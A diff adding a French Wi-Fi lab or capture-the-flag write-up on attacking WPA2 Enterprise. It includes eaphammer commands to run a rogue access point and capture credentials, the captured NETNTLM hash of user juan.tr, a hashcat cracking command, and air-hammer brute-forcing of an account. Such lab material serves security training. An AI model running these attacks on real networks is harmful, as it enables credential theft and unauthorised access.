@@ -218,6 +218,49 @@ Faire un Ctrl+C pour couper l'outil dès que l'on voit la ligne suivante :
 Bruteforcing du handshake : 
 
     hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
-    
 
+### 5) WPA2 MGT
+
+MGT = Mode d'authentification Management basé sur des certificats ou un serveur d'authentification externe.
+
+#### Trouver le flag de Juan sur "wifi-corp"
+
+Utilisation de l'outil eaphammer pour créer un faux point d'accès : 
+
+    python3 tools/eaphammer/eaphammer --cert-wizard
+    python3 tools/eaphammer/eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
+
+Attendre un peu ou faire une désauthentification.
+
+On reçoit bien un hash : 
+
+    wlan3: STA 64:32:a8:07:6c:40 IEEE 802.11: authenticated
+    wlan3: STA 64:32:a8:07:6c:40 IEEE 802.11: associated (aid 1)
+    wlan3: CTRL-EVENT-EAP-STARTED 64:32:a8:07:6c:40
+    wlan3: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+    wlan3: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+
+
+    mschapv2: Mon Oct  7 10:20:06 2024
+         domain\username:		CONTOSO\juan.tr
+         username:			juan.tr
+         challenge:			1d:a2:a4:8c:cc:21:37:3a
+         response:			0e:12:b9:ef:48:bc:ef:cf:bd:06:15:8e:11:7c:3e:93:96:ba:47:8a:71:55:f7:6a
+
+         jtr NETNTLM:			juan.tr:$NETNTLM$1da2a48ccc21373a$0e12b9ef48bcefcfbd06158e117c3e9396ba478a7155f76a
+
+         hashcat NETNTLM:		juan.tr::::0e12b9ef48bcefcfbd06158e117c3e9396ba478a7155f76a:1da2a48ccc21373a
+
+
+Bruteforcing du hash obtenu : 
+
+    hashcat -a 0 -m 5500 juan.tr::::0e12b9ef48bcefcfbd06158e117c3e9396ba478a7155f76a:1da2a48ccc21373a ~/rockyou-top100000.txt --force
+
+
+#### Faire un bruteforcing sur l'utilisateur CONTOSOLAB\test
+
+Utilisation de l'outil air-hammer pour le bruteforcing : 
+
+    echo 'CONTOSOLAB\test' > user.txt
+    python3 tools/air-hammer/air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u user.txt 
     
